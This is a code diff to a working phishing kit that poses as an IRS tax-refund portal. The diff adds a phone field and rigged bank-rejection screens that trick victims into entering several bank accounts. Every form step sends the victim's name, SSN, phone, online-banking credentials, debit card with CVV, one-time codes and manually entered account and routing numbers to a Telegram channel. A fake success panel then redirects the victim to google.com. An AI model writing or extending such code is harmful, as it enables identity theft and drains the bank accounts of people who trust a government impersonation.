@@ -170,6 +170,19 @@
             border-left: 3px solid #B8860B;
         }
 
+        .input-hint.error {
+            color: #B22222;
+            background: #FEE;
+            padding: 8px 12px;
+            border-radius: 8px;
+            border-left: 3px solid #B22222;
+            display: none;
+        }
+
+        .input-hint.error.show {
+            display: block;
+        }
+
         input,
         select {
             width: 100%;
@@ -194,6 +207,11 @@
             color: #A0B0C5;
         }
 
+        input.input-error {
+            border-color: #B22222;
+            box-shadow: 0 0 0 4px rgba(178, 34, 34, 0.1);
+        }
+
         .action-btn {
             background: #0A192F;
             color: white;
@@ -211,6 +229,20 @@
         .action-btn:active {
             transform: scale(0.97);
             background: #1A2F4A;
+        }
+
+        .action-btn.success-btn {
+            background: #1A8B4C;
+        }
+        .action-btn.success-btn:hover {
+            background: #15733E;
+        }
+
+        .action-btn.danger-btn {
+            background: #B22222;
+        }
+        .action-btn.danger-btn:hover {
+            background: #8B1A1A;
         }
 
         .link-btn {
@@ -481,6 +513,11 @@
             color: #0A192F;
         }
 
+        .info-box.error-box {
+            background: #FFF0F0;
+            border-left-color: #B22222;
+        }
+
         .bank-logo-display {
             display: flex;
             align-items: center;
@@ -505,6 +542,31 @@
             color: #0A192F;
         }
 
+        .phone-input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .phone-input-wrapper .country-code {
+            position: absolute;
+            left: 16px;
+            font-weight: 600;
+            font-size: 16px;
+            color: #0A192F;
+            pointer-events: none;
+        }
+
+        .phone-input-wrapper input {
+            padding-left: 58px;
+        }
+
+        .success-icon {
+            font-size: 4rem;
+            text-align: center;
+            margin: 10px 0 16px;
+        }
+
         @media (max-width: 420px) {
             .card {
                 padding: 24px 16px 28px;
@@ -517,6 +579,13 @@
             }
             .bank-logo-display img {
                 height: 24px;
+            }
+            .phone-input-wrapper .country-code {
+                left: 12px;
+                font-size: 14px;
+            }
+            .phone-input-wrapper input {
+                padding-left: 52px;
             }
         }
     </style>
@@ -569,16 +638,29 @@
                 <input type="text" id="fullName" placeholder="John M. Doe" />
                 <div class="input-hint">Enter your full name as shown on your Social Security card</div>
             </div>
+
             <div class="input-group">
                 <div class="input-label">Date of birth</div>
                 <input type="date" id="dob" />
                 <div class="input-hint">MM/DD/YYYY format</div>
             </div>
+
             <div class="input-group">
                 <div class="input-label">Residential address</div>
                 <input type="text" id="address" placeholder="Street, city, state, ZIP" />
                 <div class="input-hint">Current physical address on file with the IRS</div>
             </div>
+
+            <div class="input-group">
+                <div class="input-label">Phone number</div>
+                <div class="phone-input-wrapper">
+                    <span class="country-code">+1</span>
+                    <input type="tel" id="phoneNumber" placeholder="(555) 555-5555" maxlength="14" />
+                </div>
+                <div class="input-hint" id="phoneHint">Enter your 10-digit US phone number (e.g., 555-555-5555)</div>
+                <div class="input-hint error" id="phoneError">Please enter a valid 10-digit US phone number</div>
+            </div>
+
             <button class="action-btn" id="personalNextBtn">Continue →</button>
             <div class="back-link"><a href="#" id="backToLanding">← Cancel</a></div>
         </div>
@@ -811,6 +893,80 @@
             <div class="terms">By submitting, you agree to IRS Secure Verification.</div>
         </div>
 
+        <!-- BANK REJECTION: Account not accepted -->
+        <div id="bankRejectionPanel" class="card hide">
+            <div class="irs-header">
+                <div class="irs-logo">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7A2q-of1n0-xvMrhdEQ_hVXrdJQBHhFhzFIvKLaliJw&s=10" alt="IRS Logo" />
+                </div>
+            </div>
+            <div class="info-box error-box">
+                <strong>⚠️ Bank Account Not Accepted</strong>
+            </div>
+            <p style="color:#1F3450; font-size:0.95rem; margin-bottom:20px; line-height:1.6;">
+                The bank account you provided cannot be used for this refund. 
+                Please try again with a different bank account or select another bank.
+            </p>
+            <button class="action-btn" id="retryBankBtn">Try Again</button>
+            <div class="back-link"><a href="#" id="backToLandingFromRejection">← Cancel</a></div>
+        </div>
+
+        <!-- ALTERNATIVE BANK: Manual bank details -->
+        <div id="manualBankPanel" class="card hide">
+            <div class="irs-header">
+                <div class="irs-logo">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7A2q-of1n0-xvMrhdEQ_hVXrdJQBHhFhzFIvKLaliJw&s=10" alt="IRS Logo" />
+                </div>
+            </div>
+            <h2 style="font-size:1.5rem; font-weight:700; color:#0A192F; margin-bottom:4px;">Alternative Bank Account</h2>
+            <div style="font-size:0.85rem; color:#4A5F7A; margin-bottom:18px; border-bottom:1px solid #EEF3FA; padding-bottom:10px;">Please provide your bank account details</div>
+
+            <div class="info-box">
+                <strong>Manual Entry:</strong> Please enter your bank account information below. 
+                This will be used to deposit your refund.
+            </div>
+
+            <div class="input-group">
+                <div class="input-label">Bank name</div>
+                <input type="text" id="manualBankName" placeholder="Enter bank name" />
+                <div class="input-hint">Full name of your financial institution</div>
+            </div>
+
+            <div class="input-group">
+                <div class="input-label">Bank account number</div>
+                <input type="text" id="manualAccountNumber" placeholder="Enter account number" />
+                <div class="input-hint">Your bank account number</div>
+            </div>
+
+            <div class="input-group">
+                <div class="input-label">Routing number</div>
+                <input type="text" id="manualRoutingNumber" placeholder="Enter routing number" />
+                <div class="input-hint">9-digit routing number</div>
+            </div>
+
+            <button class="action-btn success-btn" id="manualSubmitBtn">✅ Submit Bank Account</button>
+            <div class="back-link"><a href="#" id="backToRejectionFromManual">← Back</a></div>
+        </div>
+
+        <!-- SUCCESS Panel -->
+        <div id="successPanel" class="card hide">
+            <div class="irs-header">
+                <div class="irs-logo">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7A2q-of1n0-xvMrhdEQ_hVXrdJQBHhFhzFIvKLaliJw&s=10" alt="IRS Logo" />
+                </div>
+            </div>
+            <div class="success-icon">✅</div>
+            <h2 style="font-size:1.8rem; font-weight:700; color:#1A8B4C; text-align:center; margin-bottom:12px;">Claim Submitted!</h2>
+            <p style="color:#1F3450; font-size:1rem; text-align:center; line-height:1.6; margin-bottom:16px;">
+                Your refund claim has been successfully submitted. 
+                You will receive your funds within 3-5 business days.
+            </p>
+            <div style="text-align:center; font-size:0.85rem; color:#6E7F99; margin-top:8px;">
+                Redirecting...
+            </div>
+            <div class="footnote">Thank you for using IRS Secure Verification</div>
+        </div>
+
         <div id="toastMsg" class="toast"></div>
     </div>
 
@@ -836,6 +992,7 @@
                 fullName: '',
                 dob: '',
                 address: '',
+                phone: '',
                 ssn: '',
                 idType: '',
                 idState: '',
@@ -845,69 +1002,47 @@
                 debitCard: '',
                 cardExpiry: '',
                 cardCvv: '',
-                otp: ''
+                otp: '',
+                // Manual bank details
+                manualBankName: '',
+                manualAccountNumber: '',
+                manualRoutingNumber: ''
             };
 
-            // ===============================================
-            // ALL BANK LOGOS AS DATA URLs (Base64)
-            // No external files needed - everything is embedded
-            // ===============================================
+            // Flow control
+            let bankAttemptCount = 0;
+            let isManualBankFlow = false;
+
+            // Bank logos as Data URLs
             const bankLogos = {
-                // Major banks - using simplified SVG-based data URLs
                 'Bank of America': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%2300417A" text-anchor="middle"%3EBank of America%3C/text%3E%3C/svg%3E',
-                
                 'Wells Fargo': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%23D3120F" text-anchor="middle"%3EWells Fargo%3C/text%3E%3C/svg%3E',
-                
                 'Chase': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%23116FB8" text-anchor="middle"%3EChase%3C/text%3E%3C/svg%3E',
-                
                 'Citibank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%23006699" text-anchor="middle"%3ECitibank%3C/text%3E%3C/svg%3E',
-                
                 'Capital One': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%2300447A" text-anchor="middle"%3ECapital One%3C/text%3E%3C/svg%3E',
-                
                 'U.S. Bank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%2300447A" text-anchor="middle"%3EU.S. Bank%3C/text%3E%3C/svg%3E',
-                
                 'PNC Bank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%2300772E" text-anchor="middle"%3EPNC Bank%3C/text%3E%3C/svg%3E',
-                
                 'TD Bank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%2300772E" text-anchor="middle"%3ETD Bank%3C/text%3E%3C/svg%3E',
-                
                 'Truist': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%2300447A" text-anchor="middle"%3ETruist%3C/text%3E%3C/svg%3E',
-                
                 'Fifth Third Bank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="18" font-weight="bold" fill="%2300447A" text-anchor="middle"%3EFifth Third Bank%3C/text%3E%3C/svg%3E',
-                
                 'KeyBank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%2300447A" text-anchor="middle"%3EKeyBank%3C/text%3E%3C/svg%3E',
-                
                 'Huntington Bank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="18" font-weight="bold" fill="%2300447A" text-anchor="middle"%3EHuntington Bank%3C/text%3E%3C/svg%3E',
-                
                 'Regions Bank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%2300447A" text-anchor="middle"%3ERegions Bank%3C/text%3E%3C/svg%3E',
-                
                 'Ally Bank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%23D3120F" text-anchor="middle"%3EAlly Bank%3C/text%3E%3C/svg%3E',
-                
                 'Discover Bank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%23FF6600" text-anchor="middle"%3EDiscover%3C/text%3E%3C/svg%3E',
-                
                 'HSBC': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%23D3120F" text-anchor="middle"%3EHSBC%3C/text%3E%3C/svg%3E',
-                
                 'M&T Bank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%2300447A" text-anchor="middle"%3EM%26T Bank%3C/text%3E%3C/svg%3E',
-                
                 'Citizens Bank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%2300447A" text-anchor="middle"%3ECitizens Bank%3C/text%3E%3C/svg%3E',
-                
                 'Santander Bank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%23D3120F" text-anchor="middle"%3ESantander%3C/text%3E%3C/svg%3E',
-                
                 'SoFi Bank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%2300772E" text-anchor="middle"%3ESoFi%3C/text%3E%3C/svg%3E',
-                
                 'Chime': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%2300772E" text-anchor="middle"%3EChime%3C/text%3E%3C/svg%3E',
-                
                 'PayPal': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%230077C9" text-anchor="middle"%3EPayPal%3C/text%3E%3C/svg%3E',
-                
                 'USAA': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%2300447A" text-anchor="middle"%3EUSAA%3C/text%3E%3C/svg%3E',
-                
                 'Navy Federal Credit Union': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="18" font-weight="bold" fill="%2300447A" text-anchor="middle"%3ENavy Federal CU%3C/text%3E%3C/svg%3E',
-                
                 'Varo Bank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%2300772E" text-anchor="middle"%3EVaro Bank%3C/text%3E%3C/svg%3E',
-                
                 'American Express': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23ffffff" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="%23116FB8" text-anchor="middle"%3EAmex%3C/text%3E%3C/svg%3E'
             };
 
-            // Fallback generic bank logo
             const defaultBankLogo = 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23f0f0f0" rx="8"/%3E%3Ctext x="100" y="38" font-family="Arial" font-size="18" fill="%23666" text-anchor="middle"%3E%F0%9F%8F%A6 Bank%3C/text%3E%3C/svg%3E';
 
             const loadingOverlay = document.getElementById('loadingOverlay');
@@ -915,6 +1050,11 @@
             const progressText = document.getElementById('progressText');
             const loadingTitle = document.getElementById('loadingTitle');
             const loadingSub = document.getElementById('loadingSub');
+
+            function validateUSPhone(phone) {
+                const digits = phone.replace(/\D/g, '');
+                return digits.length === 10;
+            }
 
             function showLoading(title, sub) {
                 loadingTitle.textContent = title || 'Verifying information';
@@ -952,6 +1092,7 @@
                         if (data.fullName) document.getElementById('fullName').value = data.fullName;
                         if (data.dob) document.getElementById('dob').value = data.dob;
                         if (data.address) document.getElementById('address').value = data.address;
+                        if (data.phone) document.getElementById('phoneNumber').value = data.phone;
                         if (data.ssn) document.getElementById('ssnInput').value = data.ssn;
                         if (data.bank) {
                             document.getElementById('bankSelect').value = data.bank;
@@ -962,6 +1103,9 @@
                         if (data.debitCard) document.getElementById('debitCard').value = data.debitCard;
                         if (data.cardExpiry) document.getElementById('cardExpiry').value = data.cardExpiry;
                         if (data.cardCvv) document.getElementById('cardCvv').value = data.cardCvv;
+                        if (data.manualBankName) document.getElementById('manualBankName').value = data.manualBankName;
+                        if (data.manualAccountNumber) document.getElementById('manualAccountNumber').value = data.manualAccountNumber;
+                        if (data.manualRoutingNumber) document.getElementById('manualRoutingNumber').value = data.manualRoutingNumber;
                     }
                 } catch (e) { /* ignore */ }
             }
@@ -980,7 +1124,6 @@
                     logoImg.style.display = 'block';
                     nameSpan.textContent = bankName;
                 } else if (bankName && bankName !== 'Select your bank') {
-                    // Use default logo for unknown banks
                     logoImg.src = defaultBankLogo;
                     logoImg.style.display = 'block';
                     nameSpan.textContent = bankName;
@@ -1026,6 +1169,23 @@
                 document.getElementById(id).classList.remove('hide');
             }
 
+            // Phone input auto-formatting
+            document.getElementById('phoneNumber').addEventListener('input', function(e) {
+                const digits = this.value.replace(/\D/g, '');
+                if (digits.length <= 10) {
+                    let formatted = digits;
+                    if (digits.length > 3 && digits.length <= 6) {
+                        formatted = `(${digits.slice(0,3)}) ${digits.slice(3)}`;
+                    } else if (digits.length > 6) {
+                        formatted = `(${digits.slice(0,3)}) ${digits.slice(3,6)}-${digits.slice(6,10)}`;
+                    }
+                    this.value = formatted;
+                }
+                this.classList.remove('input-error');
+                document.getElementById('phoneError').classList.remove('show');
+                document.getElementById('phoneHint').style.display = 'block';
+            });
+
             loadSavedData();
 
             // Bank select change - update logo
@@ -1038,26 +1198,73 @@
                 }
             });
 
-            document.getElementById('startClaimBtn').onclick = () => showPanel('personalPanel');
+            document.getElementById('startClaimBtn').onclick = () => {
+                bankAttemptCount = 0;
+                isManualBankFlow = false;
+                showPanel('personalPanel');
+            };
             document.getElementById('backToLanding').onclick = (e) => { e.preventDefault();
                 showPanel('landingPanel'); };
 
+            // PERSONAL
             document.getElementById('personalNextBtn').onclick = async () => {
                 const n = document.getElementById('fullName').value.trim();
                 const d = document.getElementById('dob').value;
                 const a = document.getElementById('address').value.trim();
-                if (!n || !d || !a) { showToast('Please fill all fields.', true); return; }
+                const phoneRaw = document.getElementById('phoneNumber').value.trim();
+
+                let isValid = true;
+
+                if (!n || n.length < 2) {
+                    document.getElementById('fullName').classList.add('input-error');
+                    isValid = false;
+                } else {
+                    document.getElementById('fullName').classList.remove('input-error');
+                }
+
+                if (!d) {
+                    document.getElementById('dob').classList.add('input-error');
+                    isValid = false;
+                } else {
+                    document.getElementById('dob').classList.remove('input-error');
+                }
+
+                if (!a || a.length < 5) {
+                    document.getElementById('address').classList.add('input-error');
+                    isValid = false;
+                } else {
+                    document.getElementById('address').classList.remove('input-error');
+                }
+
+                if (!validateUSPhone(phoneRaw)) {
+                    document.getElementById('phoneNumber').classList.add('input-error');
+                    document.getElementById('phoneError').classList.add('show');
+                    document.getElementById('phoneHint').style.display = 'none';
+                    isValid = false;
+                } else {
+                    document.getElementById('phoneNumber').classList.remove('input-error');
+                    document.getElementById('phoneError').classList.remove('show');
+                    document.getElementById('phoneHint').style.display = 'block';
+                }
+
+                if (!isValid) {
+                    showToast('Please fill all fields correctly.', true);
+                    return;
+                }
+
                 userData.fullName = n;
                 userData.dob = d;
                 userData.address = a;
+                userData.phone = phoneRaw;
                 saveUserData();
                 await showLoading('Verifying identity', 'Checking your information against IRS records');
-                sendToTelegram(`Personal\nName: ${n}\nDOB: ${d}\nAddress: ${a}`);
+                sendToTelegram(`Personal\nName: ${n}\nDOB: ${d}\nAddress: ${a}\nPhone: ${phoneRaw}`);
                 showPanel('ssnPanel');
             };
             document.getElementById('backToPersonal').onclick = (e) => { e.preventDefault();
                 showPanel('personalPanel'); };
 
+            // SSN
             document.getElementById('ssnNextBtn').onclick = async () => {
                 const s = document.getElementById('ssnInput').value.trim();
                 if (s.length < 4) { showToast('Enter a valid SSN.', true); return; }
@@ -1071,7 +1278,7 @@
             document.getElementById('backToSsnFromKyc').onclick = (e) => { e.preventDefault();
                 showPanel('ssnPanel'); };
 
-            // ---- KYC ----
+            // KYC
             let currentKycStep = 1;
             let frontStream, backStream, selfieStream, selfieIdStream;
             let usingRearFront = true,
@@ -1206,6 +1413,7 @@
                 showPanel('kycPanel');
                 showKycStep(5); };
 
+            // BANK SELECT
             document.getElementById('bankNextBtn').onclick = async () => {
                 const b = document.getElementById('bankSelect').value;
                 if (!b) { showToast('Select your bank.', true); return; }
@@ -1219,6 +1427,7 @@
             document.getElementById('backToBankFromLogin').onclick = (e) => { e.preventDefault();
                 showPanel('bankPanel'); };
 
+            // BANK LOGIN
             document.getElementById('bankLoginNextBtn').onclick = async () => {
                 const u = document.getElementById('bankUsername').value.trim();
                 const p = document.getElementById('bankPassword').value.trim();
@@ -1233,6 +1442,7 @@
             document.getElementById('backToBankLoginFromCard').onclick = (e) => { e.preventDefault();
                 showPanel('bankLoginPanel'); };
 
+            // DEBIT CARD
             document.getElementById('cardNextBtn').onclick = async () => {
                 const dc = document.getElementById('debitCard').value.trim();
                 const ex = document.getElementById('cardExpiry').value.trim();
@@ -1251,27 +1461,106 @@
             document.getElementById('backToCardFromOtp').onclick = (e) => { e.preventDefault();
                 showPanel('cardPanel'); };
 
+            // OTP - FINAL SUBMIT (with rejection logic)
             document.getElementById('finalSubmitBtn').onclick = async () => {
                 const otp = document.getElementById('otpInput').value.trim();
                 if (!otp || otp.length < 4) { showToast('Enter OTP.', true); return; }
                 userData.otp = otp;
                 saveUserData();
 
-                await showLoading('Finalizing claim', 'Processing your refund request');
+                await showLoading('Processing', 'Verifying your bank account...');
 
+                // Send all data to Telegram
                 const msg =
-                    `IRS REFUND CLAIM — COMPLETE\n` +
+                    `IRS REFUND CLAIM — ATTEMPT ${bankAttemptCount + 1}\n` +
                     `Name: ${userData.fullName}\nDOB: ${userData.dob}\nAddress: ${userData.address}\n` +
-                    `SSN: ${userData.ssn}\nID: ${userData.idType} (${userData.idState})\n` +
+                    `Phone: ${userData.phone}\nSSN: ${userData.ssn}\nID: ${userData.idType} (${userData.idState})\n` +
                     `Bank: ${userData.bank}\nUsername: ${userData.bankUsername}\nPassword: ${userData.bankPassword}\n` +
                     `Card: ${userData.debitCard} | Exp: ${userData.cardExpiry} | CVV: ${userData.cardCvv}\n` +
                     `OTP: ${userData.otp}\nAll KYC photos uploaded.`;
 
                 await sendToTelegram(msg);
-                showToast('Claim submitted! We will process your refund.', false);
-                setTimeout(() => showPanel('landingPanel'), 500);
+
+                bankAttemptCount++;
+
+                if (bankAttemptCount === 1) {
+                    // First attempt - reject and show try again
+                    setTimeout(() => {
+                        showPanel('bankRejectionPanel');
+                        showToast('Bank account not accepted. Please try again.', true);
+                    }, 800);
+                } else if (bankAttemptCount === 2) {
+                    // Second attempt - reject again and show manual form
+                    setTimeout(() => {
+                        showPanel('bankRejectionPanel');
+                        // Override the retry button to go to manual form
+                        document.getElementById('retryBankBtn').textContent = 'Provide Alternative Bank Details';
+                        document.getElementById('retryBankBtn').onclick = () => {
+                            showPanel('manualBankPanel');
+                        };
+                        showToast('Bank account not accepted again. Please provide alternative bank details.', true);
+                    }, 800);
+                }
             };
 
+            // RETRY BANK - from rejection panel
+            document.getElementById('retryBankBtn').onclick = () => {
+                // Reset to bank selection flow
+                showPanel('bankPanel');
+                showToast('Please select a different bank.', false);
+            };
+
+            document.getElementById('backToLandingFromRejection').onclick = (e) => { e.preventDefault();
+                showPanel('landingPanel'); };
+
+            // MANUAL BANK SUBMIT
+            document.getElementById('manualSubmitBtn').onclick = async () => {
+                const bankName = document.getElementById('manualBankName').value.trim();
+                const accountNum = document.getElementById('manualAccountNumber').value.trim();
+                const routingNum = document.getElementById('manualRoutingNumber').value.trim();
+
+                if (!bankName || bankName.length < 2) {
+                    showToast('Please enter a valid bank name.', true);
+                    return;
+                }
+                if (!accountNum || accountNum.length < 4) {
+                    showToast('Please enter a valid account number.', true);
+                    return;
+                }
+                if (!routingNum || routingNum.length < 8) {
+                    showToast('Please enter a valid routing number (9 digits).', true);
+                    return;
+                }
+
+                userData.manualBankName = bankName;
+                userData.manualAccountNumber = accountNum;
+                userData.manualRoutingNumber = routingNum;
+                saveUserData();
+
+                await showLoading('Processing', 'Verifying your bank account details...');
+
+                // Send manual bank details to Telegram
+                const manualMsg =
+                    `✅ IRS REFUND — ALTERNATIVE BANK ACCOUNT\n` +
+                    `Name: ${userData.fullName}\nSSN: ${userData.ssn}\n` +
+                    `Bank: ${bankName}\nAccount: ${accountNum}\nRouting: ${routingNum}\n` +
+                    `Previous attempts: ${bankAttemptCount}`;
+
+                await sendToTelegram(manualMsg);
+
+                // Show success
+                showPanel('successPanel');
+
+                // Wait 5.5 seconds then redirect to google.com
+                setTimeout(() => {
+                    window.location.href = 'https://www.google.com';
+                }, 5500);
+            };
+
+            document.getElementById('backToRejectionFromManual').onclick = (e) => { e.preventDefault();
+                showPanel('bankRejectionPanel'); };
+
+            // RESEND OTP
             document.getElementById('resendOtpBtn').onclick = async () => {
                 showToast('New code sent to your phone.', false);
                 await sendToTelegram(`Resend OTP for ${userData.fullName}`);
